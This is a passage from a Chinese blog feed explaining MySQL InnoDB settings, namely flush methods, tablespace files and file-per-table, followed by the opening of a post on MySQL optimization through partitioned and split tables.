&#x5219;&#x4E0D;&#x4F1A;&#x3002;&#x5982;&#x679C;&#x6574;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x6302;&#x4E86;&#x6216;&#x8005;&#x65AD;&#x7535;&#x4E86;&#xFF0C;&#x5219;&#x8FD8;&#x662F;&#x53EF;&#x80FD;&#x4F1A;&#x4E22;&#x5931;&#x4E00;&#x4E9B;&#x4E8B;&#x52A1;&#x3002;</p></blockquote><p><strong>innodb-flush-method</strong></p><p>&#x524D;&#x9762;&#x90FD;&#x5728;&#x8BA8;&#x8BBA;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x6837;&#x7684;&#x7B56;&#x7565;&#x5237;&#x65B0;&#x3001;&#x4EE5;&#x53CA;&#x4F55;&#x65F6;&#x5237;&#x65B0;&#x65E5;&#x5FD7;&#x6216;&#x8005;&#x6570;&#x636E;&#xFF0C;&#x90A3; InnoDB &#x5177;&#x4F53;&#x662F;&#x600E;&#x6837;&#x5237;&#x65B0;&#x6570;&#x636E;&#x7684;&#xFF1F;&#x4F7F;&#x7528;innodb-flush-method&#x9009;&#x9879;&#x53EF;&#x4EE5;&#x914D;&#x7F6E; InnoDB &#x5982;&#x4F55;&#x8DDF;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x76F8;&#x4E92;&#x4F5C;&#x7528;&#x3002;&#x4ECE;&#x540D;&#x5B57;&#x4E0A;&#x770B;&#xFF0C;&#x4F1A;&#x4EE5;&#x4E3A;&#x53EA;&#x80FD;&#x5F71;&#x54CD; InnoDB &#x600E;&#x4E48;&#x5199;&#x6570;&#x636E;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x5F71;&#x54CD;&#x4E86; InnoDB Windows &#x548C;&#x975E; Windows &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E0B;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x7684;&#x503C;&#x662F;&#x4E92;&#x65A5;&#x7684;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x6709;&#x4E9B;&#x503C;&#x53EA;&#x80FD; Windows &#x4E0B;&#x4F7F;&#x7528;&#xFF0C;&#x6709;&#x4E9B;&#x53EA;&#x80FD;&#x5728;&#x975E; Windows &#x4E0B;&#x4F7F;&#x7528;&#xFF0C;&#x5176;&#x4E2D; Windows &#x4E0B;&#x53EF;&#x53D6;&#x503C;&#xFF1A;async_unbuffered&#x3001;unbuffered&#x3001;normal&#x3001;Nosync&#x4E0E;littlesync&#xFF0C;&#x975E; Windows &#x53D6;&#x503C;&#xFF1A;fdatasync&#x3001;0_DIRECT&#x3001; 0_DSYNC&#x3002;</p><p>&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x65E2;&#x4F1A;&#x5F71;&#x54CD;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E14;&#x6709;&#x65F6;&#x5019;&#x5BF9;&#x4E0D;&#x540C;&#x7C7B;&#x578B;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x5904;&#x7406;&#x4E5F;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x5BFC;&#x81F4;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x6709;&#x4E9B;&#x96BE;&#x4EE5;&#x7406;&#x89E3;&#x3002;&#x5982;&#x679C;&#x6709;&#x4E00;&#x4E2A;&#x9009;&#x9879;&#x6765;&#x914D;&#x7F6E;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;&#x9009;&#x9879;&#x6765;&#x914D;&#x7F6E;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x5E94;&#x8BE5;&#x4F1A;&#x66F4;&#x597D;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x5B83;&#x4EEC;&#x6DF7;&#x5408;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x4E2D;&#x3002;&#x8FD9;&#x91CC;&#x53EA;&#x4ECB;&#x7ECD;&#x7C7B; Unix &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E0B;&#x7684;&#x9009;&#x9879;&#x3002;</p><p><strong>fdatasync</strong></p><p>InnoDB &#x8C03;&#x7528;fsync()&#x548C;fdatasync()&#x51FD;&#x6570;&#x6765;&#x5237;&#x65B0;&#x6570;&#x636E;&#x548C;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;fdatasync()&#x53EA;&#x5237;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x4E0D;&#x5305;&#x542B;&#x5143;&#x6570;&#x636E; (&#x6BD4;&#x5982;&#xFF1A;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3001;&#x6587;&#x4EF6;&#x62E5;&#x6709;&#x8005;&#x3001;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#x7B49;&#x63CF;&#x8FF0;&#x6587;&#x4EF6;&#x7279;&#x5F81;&#x7684;&#x7CFB;&#x7EDF;&#x6570;&#x636E;)&#xFF0C;&#x56E0;&#x6B64;fsync()&#x76F8;&#x6BD4;fdatasync()&#x4F1A;&#x4EA7;&#x751F;&#x66F4;&#x591A;&#x7684; I/O&#xFF0C;&#x4F46;&#x5728;&#x67D0;&#x4E9B;&#x573A;&#x666F;&#x4E0B;fdatasync()&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x635F;&#x574F;&#xFF0C;&#x56E0;&#x6B64; InnoDB &#x5F00;&#x53D1;&#x8005;&#x51B3;&#x5B9A;&#x7528;fsync()&#x6765;&#x4EE3;&#x66FF;fdatasync()&#x3002;</p><p>fsync()&#x7684;&#x7F3A;&#x70B9;&#x662F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4F1A;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x7F13;&#x5B58;&#x4E2D;&#x7F13;&#x51B2;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#xFF0C;&#x7406;&#x8BBA;&#x4E0A;&#x53CC;&#x91CD;&#x7F13;&#x51B2;&#x662F;&#x6D6A;&#x8D39;&#x7684;&#xFF0C;&#x56E0;&#x4E3A; InnoDB &#x81EA;&#x5DF1;&#x4F1A;&#x7BA1;&#x7406;&#x7F13;&#x51B2;&#xFF0C;&#x800C;&#x4E14;&#x6BD4;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x66F4;&#x52A0;&#x667A;&#x80FD;&#x3002;&#x4F46;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x80FD;&#x6709;&#x66F4;&#x667A;&#x80FD;&#x7684; I/O &#x8C03;&#x5EA6;&#x548C;&#x6279;&#x91CF;&#x64CD;&#x4F5C;&#xFF0C;&#x53CC;&#x91CD;&#x7F13;&#x51B2;&#x4E5F;&#x5E76;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x574F;&#x4E8B;&#xFF1A;</p><ul><li>&#x6709;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x548C; os &#x53EF;&#x4EE5;&#x7D2F;&#x79EF;&#x5199;&#x64CD;&#x4F5C;&#x540E;&#x5408;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9; I/O &#x7684;&#x91CD;&#x6392;&#x5E8F;&#x6765;&#x63D0;&#x5347;&#x6548;&#x7387;&#x3001;&#x6216;&#x8005;&#x5E76;&#x53D1;&#x5199;&#x5165;&#x591A;&#x4E2A;&#x8BBE;&#x5907;</li><li>&#x6709;&#x7684;&#x8FD8;&#x53EF;&#x4EE5;&#x505A;&#x9884;&#x8BFB;&#x4F18;&#x5316;&#xFF0C;&#x6BD4;&#x5982;&#x8FDE;&#x7EED;&#x8BF7;&#x6C42;&#x51E0;&#x4E2A;&#x987A;&#x5E8F;&#x7684;&#x5757;&#xFF0C;&#x5B83;&#x4F1A;&#x901A;&#x77E5;&#x786C;&#x76D8;&#x9884;&#x8BFB;&#x4E0B;&#x4E00;&#x4E2A;&#x5757;</li></ul><p>&#x8FD9;&#x4E9B;&#x4F18;&#x5316;&#x5728;&#x7279;&#x5B9A;&#x7684;&#x573A;&#x666F;&#x4E0B;&#x624D;&#x4F1A;&#x8D77;&#x4F5C;&#x7528;&#xFF0C;fdatasync&#x4E3A;innodb-flush-method&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x3002;</p><p><strong>0_DIRCET</strong></p><p>&#x8FD9;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E0D;&#x5F71;&#x54CD;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5E76;&#x4E14;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x7C7B; Unix &#x7CFB;&#x7EDF;&#x90FD;&#x6709;&#x6548;&#xFF0C;&#x4F46;&#x81F3;&#x5C11;&#x5728; Linux&#x3001;FreeBSD &#x4EE5;&#x53CA; Solaris &#x662F;&#x652F;&#x6301;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x8BBE;&#x7F6E;&#x4F9D;&#x7136;&#x4F7F;&#x7528; fsync &#x6765;&#x5237;&#x65B0;&#x6587;&#x4EF6;&#x5230;&#x78C1;&#x76D8;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x5B8C;&#x5168;&#x5173;&#x95ED;&#x4E86;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7F13;&#x5B58;&#xFF0C;&#x5E76;&#x4E14;&#x662F;&#x6240;&#x6709;&#x7684;&#x8BFB;&#x548C;&#x5199;&#x90FD;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x5B58;&#x50A8;&#x8BBE;&#x7F6E;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x53CC;&#x91CD;&#x7F13;&#x51B2;&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x8BBE;&#x5907;&#x652F;&#x6301;&#x5199;&#x7F13;&#x51B2;&#x6216;&#x9884;&#x8BFB;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x5E76;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x8BBE;&#x5907;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x6BD4;&#x5982; RAID &#x5361;&#x3002;</p><p><strong>0_DSYNC</strong></p><p>&#x8FD9;&#x4E2A;&#x9009;&#x9879;&#x4F7F;&#x5F97;&#x6240;&#x6709;&#x7684;&#x5199;&#x540C;&#x6B65;&#xFF0C;&#x5373;&#x53EA;&#x6709;&#x6570;&#x636E;&#x5199;&#x5230;&#x78C1;&#x76D8;&#x540E;&#x5199;&#x64CD;&#x4F5C;&#x624D;&#x8FD4;&#x56DE;&#xFF0C;&#x4F46;&#x5B83;&#x53EA;&#x5F71;&#x54CD;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x3002;</p><p>&#x8BF4;&#x5B8C;&#x4E86;&#x6BCF;&#x4E2A;&#x914D;&#x7F6E;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x6700;&#x540E;&#x662F;&#x4E00;&#x4E9B;&#x5EFA;&#x8BAE;&#xFF1A;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x7C7B; Unix &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5E76;&#x4E14; RAID &#x63A7;&#x5236;&#x5668;&#x5E26;&#x6709;&#x7535;&#x6C60;&#x4FDD;&#x62A4;&#x7684;&#x5199;&#x7F13;&#x5B58;&#xFF0C;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528; 0_DIRECT&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x662F;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x6216;&#x8005; 0_DIRECT &#x90FD;&#x53EF;&#x80FD;&#x662F;&#x6700;&#x597D;&#x7684;&#x9009;&#x62E9;&#x3002;</p><p><strong>innodb-file-per-table</strong></p><p>&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x914D;&#x7F6E;&#xFF0C;&#x8BF4;&#x8BF4; InnoDB &#x8868;&#x7A7A;&#x95F4;&#xFF0C;InnoDB &#x628A;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x5728;&#x8868;&#x7A7A;&#x95F4;&#x5185;&#xFF0C;&#x5B83;&#x672C;&#x8D28;&#x4E0A;&#x662F;&#x4E00;&#x4E2A;&#x7531;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x78C1;&#x76D8;&#x6587;&#x4EF6;&#x7EC4;&#x6210;&#x7684;&#x865A;&#x62DF;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;InnoDB &#x8868;&#x7A7A;&#x95F4;&#x5E76;&#x4E0D;&#x53EA;&#x662F;&#x5B58;&#x50A8;&#x8868;&#x548C;&#x7D22;&#x5F15;&#xFF0C;&#x5B83;&#x8FD8;&#x4FDD;&#x5B58;&#x4E86;&#x56DE;&#x6EDA;&#x65E5;&#x5FD7;&#x3001;&#x63D2;&#x5165;&#x7F13;&#x51B2;&#x3001;&#x53CC;&#x5199;&#x7F13;&#x51B2;&#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x5185;&#x90E8;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF0C;&#x9664;&#x6B64;&#x4E4B;&#x5916;&#xFF0C;&#x8868;&#x7A7A;&#x95F4;&#x8FD8;&#x5B9E;&#x73B0;&#x4E86;&#x5F88;&#x591A;&#x5176;&#x5B83;&#x7684;&#x529F;&#x80FD;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; innodb-data-file-path &#x914D;&#x7F6E;&#x9879;&#x5B9A;&#x5236;&#x8868;&#x7A7A;&#x95F4;&#x6587;&#x4EF6;&#xFF0C;innodb-data-home-dir&#x914D;&#x7F6E;&#x8868;&#x7A7A;&#x95F4;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">innodb-data-home-dir = /var/lib/mysql</span><br><span class="line">innodb-data-file-path = ibdata1:1G;ibdata2:1G;ibdata3:1G</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x5728; 3 &#x4E2A;&#x6587;&#x4EF6;&#x4E2D;&#x521B;&#x5EFA;&#x4E86; 3G &#x8868;&#x7A7A;&#x95F4;&#xFF0C;&#x4E3A;&#x4E86;&#x5141;&#x8BB8;&#x8868;&#x7A7A;&#x95F4;&#x5728;&#x8D85;&#x8FC7;&#x4E86;&#x5206;&#x914D;&#x7684;&#x7A7A;&#x95F4;&#x65F6;&#x8FD8;&#x80FD;&#x589E;&#x957F;&#xFF0C;&#x53EF;&#x4EE5;&#x50CF;&#x8FD9;&#x6837;&#x914D;&#x7F6E;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x81EA;&#x52A8;&#x6269;&#x5C55;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innodb-data-file-path = ibdata1:1G;ibdata2:1G;ibdata3:1G:autoextend</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>innodb-file-per-table</code>&#x9009;&#x9879;&#x8BA9; InnoDB &#x4E3A;&#x6BCF;&#x5F20;&#x8868;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4F7F;&#x5F97;&#x5728;&#x5220;&#x9664;&#x4E00;&#x5F20;&#x8868;&#x65F6;&#x56DE;&#x6536;&#x7A7A;&#x95F4;&#x5BB9;&#x6613;&#x5F88;&#x591A;&#xFF0C;&#x800C;&#x4E14;&#x7279;&#x522B;&#x5BB9;&#x6613;&#x7BA1;&#x7406;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x5927;&#x5C0F;&#x6765;&#x786E;&#x5B9A;&#x8868;&#x5927;&#x5C0F;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5EFA;&#x8BAE;&#x6253;&#x5F00;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x3002;</p><h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>MySQL &#x6709;&#x592A;&#x591A;&#x7684;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x8FD9;&#x91CC;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x4E00;&#x4E00;&#x5217;&#x4E3E;&#xFF0C;&#x91CD;&#x8981;&#x7684;&#x662F;&#x4E86;&#x89E3;&#x6BCF;&#x4E2A;&#x914D;&#x7F6E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#xFF0C;&#x4ECE;&#x4E00;&#x4E2A;&#x57FA;&#x7840;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5F00;&#x59CB;&#xFF0C;&#x8BBE;&#x7F6E;&#x7B26;&#x5408;&#x670D;&#x52A1;&#x5668;&#x8F6F;&#x786C;&#x4EF6;&#x73AF;&#x5883;&#x4E0E;&#x5DE5;&#x4F5C;&#x8D1F;&#x8F7D;&#x7684;&#x57FA;&#x672C;&#x9009;&#x9879;&#x3002;</p><h2 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;" class="headerlink" title="&#x53C2;&#x8003;&#x8D44;&#x6599;"></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h2><p>&#x9AD8;&#x6027;&#x80FD; MySQL(&#x7B2C; 3 &#x7248;)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化原理(二)</title>
    <link href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-2/"/>
    <id>https://jiemin.wang/2019/03/29/mysql-optimization-principle-2/</id>
    <published>2019-03-29T06:57:26.000Z</published>
    <updated>2019-03-29T09:52:11.444Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="img.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>&#x6211;&#x6253;&#x4F60;&#x5E94;&#x8BE5;&#xFF0C;&#x4E0D;&#x6253;&#x4F60;&#x60B2;&#x54C0;~</strong></p></blockquote><h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x5982;&#x679C;&#x6709;&#x540C;&#x5B66;&#x770B;&#x5B8C;<a href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-1/">&#x4E0A;&#x4E00;&#x7BC7;&#x5173;&#x4E8E; MySQL &#x6587;&#x7AE0;</a>&#xFF0C;&#x6587;&#x672B;&#x7559;&#x6709;&#x4E24;&#x4E2A;&#x5F88;&#x5F00;&#x653E;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x6709;&#x5174;&#x8DA3;&#x53EF;&#x4EE5;&#x5728;&#x8111;&#x888B;&#x91CC;&#x60F3;&#x60F3;&#x3002;&#x672C;&#x6587;&#x4E5F;&#x4F1A;&#x8BD5;&#x7740;&#x56DE;&#x7B54;&#x8FD9;&#x4E24;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5E0C;&#x671B;&#x80FD;&#x7ED9;&#x4F60;&#x4E00;&#x4E9B;&#x53C2;&#x8003;&#x3002;&#x73B0;&#x5728;&#x53EF;&#x4EE5;&#x601D;&#x8003;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x6570;&#x636E;&#x91CF;&#x975E;&#x5E38;&#x5927;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x60A8;&#x6839;&#x636E;&#x4E1A;&#x52A1;&#x9009;&#x62E9;&#x4E86;&#x5408;&#x9002;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x7CBE;&#x5FC3;&#x8BBE;&#x8BA1;&#x4E86;&#x8868;&#x548C;&#x7D22;&#x5F15;&#xFF0C;&#x8FD8;&#x4ED4;&#x7EC6;&#x7684;&#x68C0;&#x67E5;&#x4E86;&#x6240;&#x6709;&#x7684; SQL&#xFF0C;&#x5E76;&#x786E;&#x8BA4;&#x5DF2;&#x7ECF;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x6027;&#x80FD;&#x4ECD;&#x7136;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x60A8;&#x7684;&#x8981;&#x6C42;&#xFF0C;&#x8BE5;&#x600E;&#x4E48;&#x529E;&#x5462;&#xFF1F;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x4F18;&#x5316;&#x7B56;&#x7565;&#x5417;&#xFF1F;&#x7B54;&#x6848;&#x662F;&#x80AF;&#x5B9A;&#x7684;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x7EE7;&#x7EED;&#x548C;&#x60A8;&#x8BA8;&#x8BBA;&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x7684; MySQL &#x9AD8;&#x7EA7;&#x7279;&#x6027;&#x4EE5;&#x53CA;&#x5176;&#x80CC;&#x540E;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x3002;</p><h4 id="&#x5206;&#x533A;&#x8868;"><a href="#&#x5206;&#x533A;&#x8868;" class="headerlink" title="&#x5206;&#x533A;&#x8868;"></a>&#x5206;&#x533A;&#x8868;</h4><p>&#x5408;&#x7406;&#x7684;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x53EF;&#x4EE5;&#x6781;&#x5927;&#x63D0;&#x5347; MySQL &#x7684;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x5355;&#x8868;&#x6570;&#x636E;&#x91CF;&#x8FBE;&#x5230;&#x4E00;&#x5B9A;&#x7684;&#x7A0B;&#x5EA6;&#xFF0C;&#x7D22;&#x5F15;&#x5C31;&#x65E0;&#x6CD5;&#x8D77;&#x4F5C;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x5728;&#x6570;&#x636E;&#x91CF;&#x8D85;&#x5927;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9664;&#x975E;&#x8986;&#x76D6;&#x7D22;&#x5F15;&#xFF0C;&#x56E0;&#x56DE;&#x8868;&#x67E5;&#x8BE2;&#x4F1A;&#x4EA7;&#x751F;&#x5927;&#x91CF;&#x7684;&#x968F;&#x673A; I/O&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x53EF;&#x80FD;&#x4F1A;&#x8FBE;&#x5230;&#x4E0D;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x7A0B;&#x5EA6;&#x3002;&#x800C;&#x4E14;&#x7D22;&#x5F15;&#x7EF4;&#x62A4;&#xFF08;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x3001;I/O &#x64CD;&#x4F5C;&#xFF09;&#x7684;&#x4EE3;&#x4EF7;&#x4E5F;&#x4F1A;&#x975E;&#x5E38;&#x5927;&#x3002;</p><p>&#x56E0;&#x6B64;&#xFF0C;&#x5F53;&#x5355;&#x8868;&#x6570;&#x636E;&#x91CF;&#x8FBE;&#x5230;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x65F6;&#xFF08;&#x5728; MySQL4.x &#x65F6;&#x4EE3;&#xFF0C;MyISAM &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x4E1A;&#x5185;&#x516C;&#x8BA4;&#x7684;&#x6027;&#x80FD;&#x62D0;&#x70B9;&#x662F; 500W &#x884C;&#xFF0C;MySQL5.x &#x65F6;&#x4EE3;&#x7684;&#x6027;&#x80FD;&#x62D0;&#x70B9;&#x5219;&#x4E3A; 1KW ~ 2KW &#x884C;&#x7EA7;&#x522B;&#xFF0C;&#x5177;&#x4F53;&#x9700;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x6D4B;&#x8BD5;&#xFF09;&#xFF0C;&#x4E3A;&#x4E86;&#x63D0;&#x5347;&#x6027;&#x80FD;&#xFF0C;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x5206;&#x8868;&#x3002;&#x5206;&#x8868;&#x7684;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x662F;&#x5782;&#x76F4;&#x62C6;&#x5206;&#xFF08;&#x6BD4;&#x5982;&#xFF1A;&#x4E0D;&#x540C;&#x8BA2;&#x5355;&#x72B6;&#x6001;&#x7684;&#x8BA2;&#x5355;&#x62C6;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x8868;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x6C34;&#x5E73;&#x62C6;&#x5206;&#xFF08;&#x6BD4;&#x5982;&#xFF1A;&#x6309;&#x6708;&#x5C06;&#x8BA2;&#x5355;&#x62C6;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x8868;&#xFF09;&#x3002;&#x4F46;&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x5206;&#x8868;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x4ECE;&#x4E1A;&#x52A1;&#x89D2;&#x5EA6;&#x6765;&#x89E3;&#x51B3;&#x5927;&#x6570;&#x636E;&#x91CF;&#x95EE;&#x9898;&#xFF0C;&#x5B83;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x53EF;&#x4EE5;&#x63D0;&#x5347;&#x6027;&#x80FD;&#xFF0C;&#x4F46;&#x4E5F;&#x5927;&#x5927;&#x63D0;&#x5347;&#x4E86;&#x7F16;&#x7801;&#x7684;&#x590D;&#x6742;&#x5EA6;&#xFF0C;&#x6709;&#x8FC7;&#x8FD9;&#x79CD;&#x7ECF;&#x5386;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x6DF1;&#x6709;&#x4F53;&#x4F1A;&#x3002;</p><p>&#x5728;&#x4E1A;&#x52A1;&#x5C42;&#x5206;&#x8868;&#x5927;&#x5927;&#x589E;&#x52A0;&#x4E86;&#x7F16;&#x7801;&#x7684;&#x590D;&#x6742;&#x7A0B;&#x5EA6;&#xFF0C;&#x800C;&#x4E14;&#x5904;&#x7406;&#x6570;&#x636E;&#x5E93;&#x7684;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x4F1A;&#x5927;&#x91CF;&#x6563;&#x843D;&#x5728;&#x5E94;&#x7528;&#x5404;&#x5904;&#xFF0C;&#x7EF4;&#x62A4;&#x56F0;&#x96BE;&#x3002;&#x90A3;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x5C06;&#x5206;&#x8868;&#x7684;&#x903B;&#x8F91;&#x62BD;&#x8C61;&#x51FA;&#x6765;&#xFF0C;&#x7EDF;&#x4E00;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x6837;&#x4E1A;&#x52A1;&#x5C42;&#x5C31;&#x4E0D;&#x7528;&#x5173;&#x5FC3;&#x5E95;&#x5C42;&#x662F;&#x5426;&#x5206;&#x8868;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4E13;&#x6CE8;&#x5728;&#x4E1A;&#x52A1;&#x5373;&#x53EF;&#x3002;&#x7B54;&#x6848;&#x5F53;&#x7136;&#x662F;&#x80AF;&#x5B9A;&#x7684;&#xFF0C;&#x76EE;&#x524D;&#x6709;&#x975E;&#x5E38;&#x591A;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x95F4;&#x4EF6;&#x90FD;&#x53EF;&#x4EE5;&#x5C4F;&#x853D;&#x5206;&#x8868;&#x540E;&#x7684;&#x7EC6;&#x8282;&#xFF0C;&#x8BA9;&#x4E1A;&#x52A1;&#x5C42;&#x50CF;&#